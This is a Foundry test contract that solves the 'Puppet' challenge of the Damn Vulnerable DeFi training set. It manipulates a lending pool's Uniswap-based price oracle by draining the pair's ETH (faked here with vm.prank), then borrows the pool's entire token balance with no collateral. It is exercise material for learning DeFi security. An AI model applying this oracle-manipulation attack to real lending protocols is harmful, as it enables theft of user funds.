// SPDX-License-Identifier: MIT
pragma solidity =0.8.13;

import "forge-std/Test.sol";
import {PuppetPool} from "../src/damn-vulnerable-defi/contracts/puppet/PuppetPool.sol";
import {DamnValuableToken} from "../src/damn-vulnerable-defi/contracts/DamnValuableToken.sol";

contract Malicious is Test {
    PuppetPool pool;
    DamnValuableToken token;

    address uniswapPair = vm.addr(0x53ad);
    address alice = vm.addr(0x01);
    address bob = vm.addr(0x02);

    function setUp() public {
        vm.prank(alice);
        token = new DamnValuableToken();

        pool = new PuppetPool(address(token), uniswapPair);

        vm.prank(alice);
        token.transfer(address(pool), 100000e18);

        vm.prank(alice);
        token.transfer(bob, 1000e18);

        payable(bob).transfer(25 ether);
        payable(uniswapPair).transfer(10 ether);

        vm.prank(alice);
        token.transfer(uniswapPair, 10e18);
    }

    function testSetUp() public {
        assertEq(token.balanceOf(address(pool)), 100000e18);
        assertEq(token.balanceOf(uniswapPair), 10e18);
        assertEq(uniswapPair.balance, 10 ether);
        assertEq(bob.balance, 25 ether);
        assertEq(token.balanceOf(bob), 1000e18);
    }

    function testHack() public {
        console.log("Old Bob Balance: ", token.balanceOf(bob));

        // Borrow or Buy the 10 ETH owned by UniswapPair contract from the UniswapV1 Market.
        vm.prank(uniswapPair);
        payable(bob).transfer(uniswapPair.balance);

        vm.prank(bob);
        pool.borrow{value: 0}(token.balanceOf(address(pool)), bob);

        console.log("New Bob Balance: ", token.balanceOf(bob));
    }
}